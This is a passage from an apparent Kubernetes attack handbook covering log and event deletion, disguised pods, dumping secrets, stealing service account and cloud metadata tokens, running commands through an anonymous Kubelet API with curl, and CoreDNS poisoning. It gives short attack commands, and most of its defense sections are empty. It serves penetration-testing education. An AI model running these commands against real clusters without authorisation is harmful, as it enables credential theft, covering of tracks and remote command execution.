</ul>
<a class="header" href="print.html#clear-container-logs" id="clear-container-logs"><h1>Clear Container Logs</h1></a>
<p>If they are not mounted into a volume or otherwise collected, logs saved to a Pod are wiped when a Pod is destroyed. Because of this, it's common to store logs on a volume mount which can be persistent and/or collected by other services. To clear the logs from the container/pod, an attacker with access to the pod can simply <code>rm -rf /path/to/logs</code>.</p>
<a class="header" href="print.html#defending-17" id="defending-17"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#delete-kubernetes-events" id="delete-kubernetes-events"><h1>Delete Kubernetes Events</h1></a>
<p>Kubernetes events are essentially logs at the cluster layer. Events are reported to the API server and contain information about state changes such as pods being created or nodes restarting.</p>
<p>There is no <em>directory</em> where events are stored and thus it may be harder to ingest these logs into a SIEM without creating a custom application.</p>
<p>Specific logs can be queried with kubectl: <code>kubectl get events -o yaml | yq .items.1</code></p>
<pre><code class="language-yaml">apiVersion: v1
count: 298
eventTime: null
firstTimestamp: &quot;2024-03-29T04:05:01Z&quot;
involvedObject:
  apiVersion: v1
  fieldPath: spec.containers{distroless}
  kind: Pod
  name: distroless
  namespace: default
  resourceVersion: &quot;679&quot;
  uid: aa451abc-99dd-4684-b373-75a13faf42a3
kind: Event
lastTimestamp: &quot;2024-03-29T05:10:12Z&quot;
message: Pulling image &quot;istio/distroless&quot;
metadata:
  creationTimestamp: &quot;2024-03-29T04:05:01Z&quot;
  name: distroless.17c12087dd1a32b1
  namespace: default
  resourceVersion: &quot;3958&quot;
  uid: b5919efc-7277-4147-87c0-e515796b7c50
reason: Pulling
reportingComponent: &quot;&quot;
reportingInstance: &quot;&quot;
source:
  component: kubelet
  host: minikube
type: Normal

</code></pre>
<p>Or simply with <code>kubectl get events</code></p>
<p><img src="Pasted%20image%2020240331201017.png" alt="" /></p>
<p>Logs can be cleared using <code>kubectl delete events --all</code></p>
<a class="header" href="print.html#defending-18" id="defending-18"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#pod-name-similarity" id="pod-name-similarity"><h1>Pod Name Similarity</h1></a>
<p>While fairly simple, just naming a pod something that doesn't stand out is a great way to hide among &quot;known good&quot; pods.</p>
<p>In this example, a secondary <code>etcd</code> pod was created that is actually just an Ubuntu image.</p>
<pre><code class="language-yaml">apiVersion: v1
kind: Pod
metadata:
  name: etcd 
  namespace: kube-system
spec:
  containers:
  - name: ubuntu
    image: ubuntu:latest
    command: [&quot;sh&quot;,&quot;-c&quot;,&quot;sleep 100000000000000&quot;]
</code></pre>
<p><img src="Pasted%20image%2020240331201050.png" alt="" /></p>
<a class="header" href="print.html#defending-19" id="defending-19"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#connect-from-proxy-server" id="connect-from-proxy-server"><h1>Connect from proxy server</h1></a>
<p>An adequately hardened Kubernetes cluster will have access controls (such as firewalls) in place to limit traffic to the API server. Connecting to the API server from inside a trusted server (or inside an allow listed subnet) can allow an attacker access to resources as well as blend in with legitimate traffic.</p>
<p>The attack path for this would be to compromise a developers machine, then masquerade as the developer's identity to to perform further actions against a Kubernetes cluster.</p>
<a class="header" href="print.html#defending-20" id="defending-20"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#credential-access" id="credential-access"><h1>Credential access</h1></a>
<p>The credential access technique can mean a few different things, but in general, it's techniques an attacker can use to gain access to sensitive information. Credentials can be stored in every layer of a Kubernetes cluster.</p>
<ul>
<li><a href="./Credential_access/List_K8S_secrets.md">List K8S secrets</a></li>
<li><a href="./Credential_access/Access_node_information.md">Access Node Information</a></li>
<li><a href="./Credential_access/Container_service_account.md">Container Service Account</a></li>
<li><a href="./Credential_access/Application_credentials_in_configuration_files.md">Application Credentials In Configuration Files</a></li>
<li><a href="./Credential_access/Access_managed_identity_credentials.md">Access Managed Identity Credentials</a></li>
<li><a href="./Credential_access/Malicious_admission_controller.md">Malicious Admission Controller</a></li>
</ul>
<a class="header" href="print.html#list-k8s-secrets" id="list-k8s-secrets"><h1>List K8S secrets</h1></a>
<p>Listing Kubernetes secrets is a bit unintuitive. A &quot;list&quot; of all secrets (in a namespace) can be created by running <code>kubectl get secrets</code> This access is granted by the RBAC <code>list</code> verb.</p>
<p>In practice this looks relatively safe, however, an attacker can simply output the metadata associated with the secret as YAML or JSON and access the actual secret.</p>
<p><img src="../images/Pasted%20image%2020240331130924.png" alt="" /></p>
<p>The RBAC <code>get</code> verb refers to getting a specific secret. The actual secret can be queried with <code>kubectl get secret &lt;secret_name&gt; -o yaml | yq .data.&lt;secret_field&gt; | base64 -d</code></p>
<p><img src="../images/Pasted%20image%2020240331125207.png" alt="" /></p>
<p>A one liner from, <a href="https://www.antitree.com/2020/11/when-list-is-a-lie-in-kubernetes/">AntiTree</a> to &quot;dump all the ClusterRoles that have LIST but not GET permissions. The thought is that if you have LIST without GET, you‚Äôre attempting to restrict access to secrets but you‚Äôre going to be sorely mistaken.&quot;</p>
<pre><code class="language-bash">kubectl get clusterroles -o json |\
    jq -r '.items[] | select(.rules[] |
    select((.resources | index(&quot;secrets&quot;)) 
    and (.verbs | index(&quot;list&quot;)) 
    and (.verbs | index(&quot;get&quot;) | not))) |
    .metadata.name'
</code></pre>
<p>Like most resources, secrets are namespace scoped.
<img src="../images/Pasted%20image%2020240331134143.png" alt="" /></p>
<a class="header" href="print.html#defending-21" id="defending-21"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#access-node-information" id="access-node-information"><h1>Access node information</h1></a>
<p>Kubernetes nodes often store sensitive information that should not be accessible from within a pod. If an attacker has access to files on a node, they may be able to use these information identified for various other techniques such as <a href="../Privilege_escalation.md">Privilege Escalation</a>.</p>
<p>Accessing node information requires either one of the following:</p>
<ol>
<li>A Container breakout vulnerability</li>
<li>Kubernetes misconfiguration</li>
</ol>
<p>Having full read access to a node's filesystem is dangerous as this gives an attacker access to read the <a href="../overlay2.md">overlay2</a> storage driver and access other sensitive information stored on nodes. Much of the information of value is stored in <code>/etc/kubernetes</code>. If able to access a node, normal Linux privilege escalation techniques apply such as searching for credentials.</p>
<p><a href="https://github.com/grahamhelton/dredge">Dredge</a> can be used to search for secrets on a node.</p>
<p><img src="../images/Pasted%20image%2020240331135730.png" alt="" /></p>
<a class="header" href="print.html#interesting-node-files-and-directories" id="interesting-node-files-and-directories"><h1>Interesting node files and directories</h1></a>
<p>The locations of some potentially interesting files: Note this can vary greatly depending on the implementation details of a cluster. Note this list is not exhaustive:</p>
<ul>
<li><code>/etc/kubernetes/</code>: The default place to store Kubernetes specific information</li>
<li><code>/etc/kubernetes/azure.json</code> When on an AKS cluster, default location where service principles are stored.</li>
<li><code>/etc/kubernetes/manifests</code>: The default place to store manifests <a href="../Persistence/Static_pods.md">See Persistence -&gt; Static Pods</a></li>
<li><code>/var/lib/kubelet/*</code>:  Files used by the kubelet</li>
</ul>
<a class="header" href="print.html#defending-22" id="defending-22"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#container-service-accounts" id="container-service-accounts"><h1>Container service accounts</h1></a>
<p>When a pod makes a request to the API server, the pod authenticates as a Service account. You can inspect which service account a pod is using by querying the API server. <code>kubectl get pods/&lt;pod_name&gt; -o yaml | yq .spec.serviceAccountName</code>.
<img src="../images/Pasted%20image%2020240322112135.png" alt="" /></p>
<p>If a service account is not set in the manifest, Kubernetes automatically sets it which can be accessed from inside the pod at one of the following locations:</p>
<pre><code class="language-bash">/run/secrets/kubernetes.io/serviceaccount
/var/run/secrets/kubernetes.io/serviceaccount
/secrets/kubernetes.io/serviceaccount
</code></pre>
<p>A manifest can opt out of mounting a service account by specifying in either the Pod or ServiceAccount manifest but the Pod spec takes precedence:</p>
<pre><code class="language-yaml"># ServiceAccount manifest disabling automounting
# Manifest from: https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/
apiVersion: v1
kind: ServiceAccount
metadata:
  name: build-robot
automountServiceAccountToken: false

</code></pre>
<pre><code class="language-yaml"># Pod manifest disabling automounting
# Manifest from: https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/
apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  serviceAccountName: build-robot
  automountServiceAccountToken: false
  ...
</code></pre>
<p>Service accounts are namespace specific and can be listed with <code>kubectl get serviceaccount -n &lt;namespace&gt;</code></p>
<p>By default, the service account granted to pods in the <code>kube-system</code> namespace grants full access to all resources. Service account permissions can be can be verified with the following kubectl command. The below command runs <code>kubectl auth can-i --list</code> using the service account tokens/certificates/namespace mounted in the Pod's default locations. You may need to change the location of <code>--token</code>,<code>--certificate-authhority</code>, and <code>-n</code> if the secret is in a non-standard location.</p>
<pre><code class="language-bash"># Run kubectl and grab the service account tokens/certificate/namespace
# from their default locations. You may need to alter this if they're in
# non standard locations
./kubectl auth can-i --list \
--token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) \
--certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
-n $(cat /run/secrets/kubernetes.io/serviceaccount/namespace)
</code></pre>
<p>The following RBAC shows that this ServiceAccount in the <code>kube-system</code> namespace has full access to all resources and verbs.</p>
<p><img src="../images/Pasted%20image%2020240322115345.png" alt="" /></p>
<p>In contrast, the default ServiceAccount in a namespace that is not <code>kube-system</code> does not have any useful RBAC permissions.</p>
<p><img src="../images/Pasted%20image%2020240322115957.png" alt="" /></p>
<p>This ServiceAccount has <code>get</code>,<code>list</code>, and <code>watch</code> permissions for the <code>pod</code> resource.
<img src="../images/Pasted%20image%2020240322122020.png" alt="" /></p>
<a class="header" href="print.html#find-rbac-associated-with-service-accounts" id="find-rbac-associated-with-service-accounts"><h1>Find RBAC associated with service accounts</h1></a>
<p>Sometimes it's useful to find the RBAC assocaited with a ServiceAccount. Run the following command replacing <code>REPLACEME</code> with the name of the service account you wish to view the RBAC verbs for.</p>
<pre><code class="language-bash"># Remember to replace REPLACEME
kubectl get rolebinding,clusterrolebinding \
--all-namespaces -o \
jsonpath='{range .items[?(@.subjects[0].name==&quot;REPLACEME&quot;)]}[{.roleRef.kind},{.roleRef.name}]{end}'
</code></pre>
<p>The output will show the Role that is applied binded to this service account. The RBAC associated with that rule can be queried with <code>kubectl describe &lt;name&gt;</code></p>
<p><img src="../images/Pasted%20image%2020240322122528.png" alt="" /></p>
<p>Alternatively you can run <code>kubectl get rolebindings,clusterrolebindings --all-namespaces -o wide | grep &lt;ServiceAccountName&gt;</code> but the output is very large.</p>
<a class="header" href="print.html#serviceaccount-api-tokens" id="serviceaccount-api-tokens"><h1>ServiceAccount API Tokens</h1></a>
<p>Additionally an API token can be created for a service account that can be used to authenticate.
<img src="../images/Pasted%20image%2020240322124414.png" alt="" /></p>
<a class="header" href="print.html#defending-23" id="defending-23"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#application-credentials-in-configuration-files" id="application-credentials-in-configuration-files"><h1>Application credentials in configuration files</h1></a>
<p>Accessing application credentials is not a Kubernetes specific issue, however, credentials used in a Kubernetes cluster may be visible through manifests. Most notably, gaining access to an Infrastructure as Code repository could lead to sensitive information being identified from manifests.</p>
<p>Additionally, Kubernetes ConfigMaps are frequently used to pass information to a pod. This can be in the form of configuration files, environment variables, etc.</p>
<p>In this example, information is passed via a ConfigMap to a Pod running postgres which sets the environment variables <code>POSTGRS_DB</code>, <code>POSTGRES_USER</code>, <code>POSTGRES_PASSWORD</code>, and <code>PGDATA</code>. While ConfigMaps are not <em>supposed</em>  to be used for sensitive information, they still can be used to pass in information such as passwords.</p>
<pre><code class="language-yaml">apiVersion: v1
kind: ConfigMap
metadata:
  name: postgres-config
  labels:
    app: ecommerce
    tier: postgres
data:
  POSTGRES_DB: prod 
  POSTGRES_USER: prod 
  POSTGRES_PASSWORD: 123graham_is_SO_cool123 
  PGDATA: /var/lib/postgresql/data/pgdata
</code></pre>
<p>After a config map is created, it can be referenced by a manifest by using <code>- configMapRef</code> which will link the config map to the Pod.</p>
<pre><code class="language-yaml">apiVersion: v1
kind: Pod 
metadata:
  name: postgres 
spec:
  containers:
  - name: postgres
    image: postgres:latest
    envFrom:
      - configMapRef:
          name: postgres-config
</code></pre>
<p>Once inside the pod, environment variables passed in via ConfigMaps can be listed with <code>env</code>.</p>
<p><img src="../images/Pasted%20image%2020240331145655.png" alt="" /></p>
<p>Beyond ConfigMaps, searching for potentially sensitive strings such as <code>PASSWORD=</code>, is worthwhile. A tool like <a href="https://github.com/grahamhelton/dredge">Dredge</a> can be used for this.</p>
<p><img src="../images/Pasted%20image%2020240331152414.png" alt="" /></p>
<a class="header" href="print.html#defending-24" id="defending-24"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#access-managed-identity-credentials" id="access-managed-identity-credentials"><h1>Access managed identity credentials</h1></a>
<p>With access to a Kubernetes cluster running in  a cloud environment, a common way to escalate privileges is by accessing the <a href="">IMDS</a> endpoint at <code>169.254.169.254/latest/meta-data/iam/security-credentials/&lt;user&gt;</code> to obtain tokens that may allow for privielge escalation or lateral movement.</p>
<p><img src="../images/Pasted%20image%2020240329002531.png" alt="" /></p>
<p>This attack is different depending on the cloud provider.</p>
<a class="header" href="print.html#azure" id="azure"><h1>Azure</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è</p>
</blockquote>
<a class="header" href="print.html#gcp" id="gcp"><h1>GCP</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è</p>
</blockquote>
<a class="header" href="print.html#aws" id="aws"><h1>AWS</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è</p>
</blockquote>
<a class="header" href="print.html#defending-25" id="defending-25"><h1>Defending</h1></a>
<p>For AWS environments, enforcing the use of [[IMDSv2]] can help mitigate this attack or simply disable the IMDS if it's unneeded. <a href="https://github.com/grahamhelton/IMDSpoof">IMDSpoof</a> can be used in conjunction with honey tokens to create detection.</p>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è</p>
</blockquote>
<a class="header" href="print.html#resources--references" id="resources--references"><h1>Resources &amp; References</h1></a>
<p><a href="https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/">Nick Frichette</a> has a wonderful resource for pentesting cloud environments.</p>
<a class="header" href="print.html#malicious-admission-controller-1" id="malicious-admission-controller-1"><h1>Malicious admission controller</h1></a>
<p>See <a href="../Persistence/Malicious_admission_controller.md">Persistence -&gt; Malicious admission controller</a></p>
<a class="header" href="print.html#discovery" id="discovery"><h1>Discovery</h1></a>
<p>Discovering what information is useful for attacking a cluster is 80% of the work.</p>
<ul>
<li><a href="./Discovery/Access_kubernetes_API_server.md">Access Kubernetes API Server</a></li>
<li><a href="./Discovery/Access_kubelet_API.md">Access Kubelet API</a></li>
<li><a href="./Discovery/Network_mapping.md">Network Mapping</a></li>
<li><a href="./Discovery/Exposed_sensitive_interfaces.md">Exposed Sensitive Interfaces</a></li>
<li><a href="./Discovery/Instance_metadata_API.md">Instance Metadata API</a></li>
</ul>
<a class="header" href="print.html#access-kubernetes-api-server" id="access-kubernetes-api-server"><h1>Access Kubernetes API server</h1></a>
<p>The kubernetes API server is the central communication channel with the cluster. This is what kubectl interacts with (although you can interact with it directly by sending REST requests using something such as curl).</p>
<p>The API server can be found by looking for the <code>KUBERNETES_PORT_443_TCP</code> environment variable inside of a pod. Without proper permissions you can't do much by accessing the API, but you should still ensure that only trusted machines can talk to it.</p>
<p><img src="../images/Pasted%20image%2020240401115238.png" alt="" /></p>
<ul>
<li>Image from: https://kubernetes.io/docs/concepts/security/controlling-access/#api-server-ports-and-ips</li>
</ul>
<a class="header" href="print.html#transport-security" id="transport-security"><h1>Transport security</h1></a>
<p>The official documentation page has a great overview:</p>
<blockquote>
<p>By default, the Kubernetes API server listens on port 6443 on the first non-localhost network interface, protected by TLS. In a typical production Kubernetes cluster, the API serves on port 443. The port can be changed with the <code>--secure-port</code>, and the listening IP address with the <code>--bind-address</code> flag.</p>
<p>The API server presents a certificate. This certificate may be signed using a private certificate authority (CA), or based on a public key infrastructure linked to a generally recognized CA. The certificate and corresponding private key can be set by using the <code>--tls-cert-file</code> and <code>--tls-private-key-file</code> flags.</p>
<p>If your cluster uses a private certificate authority, you need a copy of that CA certificate configured into your <code>~/.kube/config</code> on the client, so that you can trust the connection and be confident it was not intercepted.</p>
</blockquote>
<a class="header" href="print.html#authentication" id="authentication"><h2>Authentication</h2></a>
<p>Authentication then takes place using client certificates, bearer tokens, or an authenticating proxy to authenticate API requests. Any identity that creates an API call using a valid certificate signed by the cluster's CA is considered authenticated. <a href="https://kubernetes.io/docs/reference/access-authn-authz/authentication/">The documentaion</a> has much more information on Kubernetes authentication.</p>
<a class="header" href="print.html#authorization" id="authorization"><h2>Authorization</h2></a>
<p>All API requests are evaluated using the API server. Permissions are denied by default. There are a few different authorization modes that can be used by the API server:</p>
<ul>
<li><a href="https://kubernetes.io/docs/reference/access-authn-authz/node/">Node</a>:  Special mode used by kubelets</li>
<li><a href="https://kubernetes.io/docs/reference/access-authn-authz/rbac/">RBAC</a>: The most common access control method. Grants roles or users access to resources.</li>
<li><a href="https://kubernetes.io/docs/reference/access-authn-authz/abac/">ABAC</a>: A more granular (and complex) access control system than RBAC. Can be used with RBAC. Enabled by adding <code>--authorization-mode=ABAC</code> to the API server manifest (often found in <code>/etc/kubernetes/manifests/kube-apiserver.yaml</code>). <a href="https://overcast.blog/mastering-kubernetes-attribute-based-access-control-abac-bb6a732cd561">Great overview here</a></li>
<li><a href="https://kubernetes.io/docs/reference/access-authn-authz/webhook/">Webhook</a>: Causes Kubernetes to query an outside service to determine user privileges.</li>
</ul>
<a class="header" href="print.html#admission-control" id="admission-control"><h2>Admission Control</h2></a>
<p>After authentication and authorization, any admission controllers that are present act on the request. For example, if an admission controller is put into place that disallows privileged pods from being created, attempting to create a privileged pod will be stopped after authentication and authorization occurs.</p>
<a class="header" href="print.html#enumeration--situational-awareness" id="enumeration--situational-awareness"><h1>Enumeration &amp; Situational Awareness</h1></a>
<p>During an engagement, it's possible to land on a machine that is using a Kubeconfig (or one is found). To see where the API server is in the context of the Kubeconfig being used, the command <code>kubectl config view --raw</code> can be used to view the Kubeconfig file. Additionally, <code>kubect config current-context</code> will return the cluster name.</p>
<p><img src="../images/Pasted%20image%2020240401131919.png" alt="" /></p>
<a class="header" href="print.html#defending-26" id="defending-26"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#access-kubelet-api" id="access-kubelet-api"><h1>Access Kubelet API</h1></a>
<p>The Kubelet is an agent that runs on a Kubernetes node. This is the component that established communication between the node and API server.  The Kubelet doesn't manage containers that were not created by Kubernetes, however, it can create Static Pods. See <a href="">staticpods</a>. Once the pod has been scheduled on a node, the Kubelet running on that node picks it up and takes care of actually starting containers.</p>
<p>Depending on the cluster, the settings defining authorization and authentication to the Kubelet API server can be found in various locations such as¬†<code>/etc/systemd/system/kubelet.service.d/10-kubeadm.conf</code>.</p>
<a class="header" href="print.html#kubelet-authentication" id="kubelet-authentication"><h2>Kubelet Authentication</h2></a>
<p>By default, requests that are not outright rejected are given the username <code>system:anonymous</code> and a group of <code>system:unauthenticated</code>. To disable anonymous authentication, start the kubelet with the <code>--anonymous-auth=false</code> flag.</p>
<a class="header" href="print.html#kubelet-authorization" id="kubelet-authorization"><h2>Kubelet Authorization</h2></a>
<p>The Kubelet can serve a small REST API with read access on port 10250. Make requests to the a kubelet API to:
- Run commands (possibly interactively) in a different pod
- Start a new pod with privileges and node filesystem/resource access</p>
<p>Any request that is authenticated (even anonymous requests) is then authorized. Some information expanded upon from <a href="https://gist.github.com/lizrice/c32740fac51db2a5518f06c3dae4944f">Liz Rice's Github Gist</a></p>
<ul>
<li>If¬†<code>--anonymous-auth</code>¬†is turned off, you will see a¬†<code>401 Unauthorized</code>¬†response.<br />
<img src="../images/Pasted%20image%2020240401151622.png" alt="" /></li>
<li>If¬†<code>--anonymous-auth=true</code>¬†but <code>--authorization-mode</code>is not set to <code>AlwaysAllow</code>, you will get a <code>Forbidden (user=system:anonymous, verb=get, resource=nodes, subresource=proxy)</code>  response.
<img src="../images/Pasted%20image%2020240401151631.png" alt="" /></li>
<li>If¬†<code>--anonymous-auth=true</code>¬†and¬†<code>--authorization-mode=AlwaysAllow</code>¬†¬†you'll see a list of pods.<br />
<img src="../images/Pasted%20image%2020240401152205.png" alt="" /></li>
</ul>
<p>When making changes, restart the systemd service with¬†<code>sudo systemctl daemon-reload ; sudo systemctl restart kubelet.service</code></p>
<a class="header" href="print.html#attacking-1" id="attacking-1"><h1>Attacking</h1></a>
<p>As an attacker, you can attempt to run a curl command against the Kubelet running on a node. If you can do this, it's pretty much game over for the node. What we're looking for is a kubelet with the both the flags <code>--anonymous-auth=true</code> and <code>--authorization-mode=AlwaysAllow</code> to be passed to the Kubelet startup command.</p>
<p>Attempt to communicate with kubelet by running:¬†<code>curl -sk https://&lt;node ip&gt;:10250/runningpods/ | jq</code>. If successful, a ton of JSON will be returned.</p>
<p>If  the message returned message is<code>Forbidden (user=system:anonymous, verb=get, resource=nodes, subresource=proxy)</code> or simply <code>Unauthorized</code>, the Kubelet probably has <code>--anonymous-auth=false</code> and/or does not have <code>--authorization-mode=AlwaysAllow</code> set and thus you cannot communicate with the Kubelet API.</p>
<p>If pods ARE returned, there is a lot of useful information such as namespace data that can show you new namespaces you previously didn't know about.</p>
<p>If you don't have JQ and you don't want to upload it, you can do some funky parsing with <code>sed</code> to make things more legible <code>curl -sk https://192.168.49.2:10250/runningpods/ | sed s/,/\\n/g | sed s/^{/\\n/</code>.
<img src="../images/Pasted%20image%2020240401145250.png" alt="" />
Using the <code>pod name</code>,<code>namespace</code>, and <code>container_name</code> data from the previous curl command you can attempt to execute commands on the pod by running:¬†<code>curl -sk https://&lt;master node ip&gt;:10250/run/&lt;namespace&gt;/&lt;pod_name&gt;/&lt;container_name&gt;/ -d &quot;cmd=id&quot;</code>. This will attempt to run the <code>id</code> command (Or any command you wish, just make sure the binary is actually on the pod.)</p>
<p><img src="../images/Pasted%20image%2020240401145846.png" alt="" /></p>
<a class="header" href="print.html#defending-27" id="defending-27"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<p>Network mapping in kubernetes is fundamentally the same concept as network mapping <em>any</em> network. There are a few unique challanges when it comes to mapping a network within a kubenetes cluster depending on your level of access. Get IP of pod if for some reason you need to: <code>k get pod ssh -o custom-columns=NAME:metadata.name,IP:status.podIP</code></p>
<a class="header" href="print.html#kubernetes-ip-address-ranges" id="kubernetes-ip-address-ranges"><h1>Kubernetes IP Address Ranges</h1></a>
<ul>
<li>The network plugin is configured to assign IP addresses to Pods.</li>
<li>The kube-apiserver assigns IP addresses to Services</li>
<li>The Kubelet (or cloud-controller-manager) assigns IPs to a node.</li>
</ul>
<a class="header" href="print.html#container-to-container-networking" id="container-to-container-networking"><h2>Container to Container Networking</h2></a>
<p>For networking, containers within a pod behave as if they are on the same host. They can all reach each other's ports on localhost since they share some resources (including volumes, cpu, ram, etc).</p>
<a class="header" href="print.html#service-discovery" id="service-discovery"><h1>Service Discovery</h1></a>
<p>Services can be discovered in all namspaces with <code>kubectl get services -A</code>. Once getting a list of services, you can query the manifest of a services by running <code>kubectl get service &lt;service_name&gt; -o yaml</code>. This will give you an idea of what port's the service is running on. In this case, the nginx server was running on port 80. To connect to this service, the command <code>kubectl port-forward service/&lt;service_name&gt; 8080:80</code> can be run which maps port 8080 on our local machine to the service's port 80. In this case, it's an nginx webpage that we can reach by navigating to it in our browser at <code>127.0.0.1:8080</code></p>
<p><img src="../images/Pasted%20image%2020240402111003.png" alt="" /></p>
<p><img src="../images/Pasted%20image%2020240402111305.png" alt="" /></p>
<a class="header" href="print.html#defending-28" id="defending-28"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#exposed-sensitive-interfaces-1" id="exposed-sensitive-interfaces-1"><h1>Exposed Sensitive Interfaces</h1></a>
<p>See <a href="../Initial_access/Exposed_sensitive_interfaces.md">Initial Access -&gt; Exposed Sensitive Interfaces</a></p>
<a class="header" href="print.html#instance-metadata-api" id="instance-metadata-api"><h1>Instance Metadata API</h1></a>
<p>See <a href="../Credential_access/Access_managed_identity_credentials.md">Credential Access -&gt; Access Managed Identity Credential</a></p>
<a class="header" href="print.html#lateral-movement" id="lateral-movement"><h1>Lateral Movement</h1></a>
<p>Lateral movement in Kubernetes typically means moving from one pod to another. This is an important step in privilege escalation as different pods can be granted different permissions.</p>
<ul>
<li><a href="./Lateral_movement/Access_cloud_resources.md">Access Cloud Resources</a></li>
<li><a href="./Lateral_movement/Container_service_account.md">Container Service Account</a></li>
<li><a href="./Lateral_movement/Cluster_internal_networking.md">Cluster Internal Networking</a></li>
<li><a href="./Lateral_movement/Application_credentials_in_configuration_files.md">Application Credentials In Configuration Files</a></li>
<li><a href="./Lateral_movement/Writable_hostPath_mount.md">Writable hostpath Mount</a></li>
<li><a href="./Lateral_movement/CoreDNS_poisoning.md">CoreDNS Poisoning</a></li>
<li><a href="./Lateral_movement/ARP_poisoning_and_IP_spoofing.md">ARP Poisoning and IP Spoofing</a></li>
</ul>
<a class="header" href="print.html#access-cloud-resources-1" id="access-cloud-resources-1"><h1>Access Cloud Resources</h1></a>
<p>See <a href="../Credential_access/Access_managed_identity_credentials.md">Credential Access -&gt; Access Managed Identity Credential</a></p>
<a class="header" href="print.html#container-service-account-1" id="container-service-account-1"><h1>Container Service Account</h1></a>
<p>See <a href="../Credential_access/Container_service_account.md"> Credential Access -&gt; Container Service Account</a></p>
<a class="header" href="print.html#cluster-internal-networking" id="cluster-internal-networking"><h1>Cluster Internal Networking</h1></a>
<p>By default, Pods in a cluster can communicate with each other if there are no network policies in place preventing this. This allows pods to communicate even across namespaces.</p>
<p>In the following example, the pod IP for <code>my-nginx-pod</code> is obtained by running <code>kubectl get pod my-nginx-pod -o custom-columns=NAME:metadata.name,IP:status.podIP</code>
<img src="../images/Pasted%20image%2020240404143403.png" alt="" /></p>
<p>To demonstrate that we can reach this pod from the <code>dmz</code> namespace, the command <code>kubectl exec -it tcpdump -n dmz -- wget -O - 10.244.0.52</code> is ran. The returned information is the default nginx webpage.
<img src="../images/Pasted%20image%2020240404143448.png" alt="" /></p>
<a class="header" href="print.html#defending-29" id="defending-29"><h1>Defending</h1></a>
<p>This can be &quot;fixed&quot; by implementing network policies</p>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è</p>
</blockquote>
<a class="header" href="print.html#references-and-resources" id="references-and-resources"><h1>References and resources</h1></a>
<ul>
<li><a href="https://www.tigera.io/learn/guides/kubernetes-networking/">Kubernetes Networking</a></li>
<li><a href="https://opensource.com/article/22/6/kubernetes-networking-fundamentals">Kubernetes Networking Fundamentals</a></li>
<li><a href="https://kubernetes-threat-matrix.redguard.ch/lateral-movement/cluster-internal-networking/">Kubernetes Threat Matrix</a></li>
</ul>
<a class="header" href="print.html#application-credentials-in-configuration-files-1" id="application-credentials-in-configuration-files-1"><h1>Application Credentials In Configuration Files</h1></a>
<p>See <a href="../Credential_access/Application_credentials_in_configuration_files.md">Credential Access -&gt; Application Credentials In Configuration Files</a></p>
<a class="header" href="print.html#writable-hostpath-mount-1" id="writable-hostpath-mount-1"><h1>Writable hostPath mount</h1></a>
<p>See <a href="../Persistence/Writable_hostPath_mount.md">Persistence -&gt; Writable hostPath mount</a></p>
<a class="header" href="print.html#coredns-poisoning" id="coredns-poisoning"><h1>CoreDNS poisoning</h1></a>
<p>CoreDNS is the &quot;new&quot; DNS system for Kubernetes which replaced the old KubeDNS system.</p>
<p>By default, the CoreDNS configuration is stored as a configmap in the <code>kube-system</code> namespace</p>
<p>The following is an example of a CoreDNS configuration file.</p>
<pre><code class="language-yaml">apiVersion: v1
data:
  Corefile: |
    .:53 {
        log
        errors
        health {
           lameduck 5s
        }
        ready
        kubernetes cluster.local in-addr.arpa ip6.arpa {
           pods insecure
           fallthrough in-addr.arpa ip6.arpa
           ttl 30
        }
        prometheus :9153
        hosts {
           192.168.49.1 host.minikube.internal
           fallthrough
        }
        forward . /etc/resolv.conf {
           max_concurrent 1000
        }
        cache 30
        loop
        reload
        loadbalance
    }
kind: ConfigMap
metadata:
  creationTimestamp: &quot;2024-03-29T04:00:45Z&quot;
  name: coredns
  namespace: kube-system
  resourceVersion: &quot;417&quot;
  uid: 40770875-a1f7-4bf0-aeb5-4b71f60035a1

</code></pre>
<a class="header" href="print.html#attacking-2" id="attacking-2"><h1>Attacking</h1></a>
<p>If an attacker is able to edit this ConfigMap, they could redirect DNS traffic. In the following example, running <code>kubectl exec -it tcpdump -- nslookup grahamhelton.com</code> returns the name servers of <code>grahamhelton.com</code></p>
<ul>
<li><code>18.165.83.26</code></li>
<li><code>18.165.83.67</code></li>
<li><code>18.165.83.47</code></li>
<li><code>18.165.83.124</code></li>
</ul>
<p>Running <code>nslookup</code> outside of a pod returns the same results.</p>
<p><img src="../images/Pasted%20image%2020240404133500.png" alt="" /></p>
<p>The CoreDNS config map file can be queried using <code>kubectl get configmap coredns -n kube-system -o yaml</code>.</p>
<p><img src="../images/Pasted%20image%2020240404135109.png" alt="" />
